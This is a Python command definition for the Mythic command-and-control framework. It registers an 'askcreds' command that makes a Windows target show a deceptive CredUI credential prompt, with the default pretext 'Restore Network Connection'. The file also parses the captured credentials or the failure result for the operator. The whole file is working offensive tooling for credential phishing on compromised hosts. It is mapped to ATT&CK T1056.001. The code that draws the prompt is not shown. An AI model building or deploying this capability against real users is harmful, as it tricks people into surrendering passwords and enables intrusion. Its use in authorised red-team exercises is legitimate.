from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class AskCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="reason",
                type=ParameterType.String,
                description="Reason to show to the user for requesting credentials",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=False,
                )],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.set_arg("reason", self.command_line)
        else:
            self.set_arg("reason", "Restore Network Connection")


class AskCredsCommand(CommandBase):
    cmd = "askcreds"
    needs_admin = False
    help_cmd = "askcreds [reason]"
    description = "Prompt the user for their Windows credentials using CredUI"
    version = 1
    author = "@checkymander"
    argument_class = AskCredsArguments
    attackmapping = ["T1056.001"]  # Input Capture: Keylogging
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        reason = taskData.args.get_arg("reason")
        if reason:
            response.DisplayParams = f"Reason: {reason}"
        else:
            response.DisplayParams = "Reason: Restore Network Connection (default)"
            
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            if response and response.strip():
                # Check if it's a success message with credentials
                if "[+] Credentials captured successfully!" in response:
                    resp.UserOutput = response
                    resp.Success = True
                elif "Credential prompt timed out" in response:
                    resp.UserOutput = "❌ Credential prompt timed out after 60 seconds"
                    resp.Success = False
                elif "canceled by the user" in response:
                    resp.UserOutput = "❌ User canceled the credential prompt"
                    resp.Success = False
                else:
                    resp.UserOutput = response
                    resp.Success = False
            else:
                resp.UserOutput = "❌ No response received from askcreds command"
                resp.Success = False
                
        except Exception as e:
            resp.UserOutput = f"❌ Error processing askcreds response: {e}"
            resp.Success = False
            
        return resp
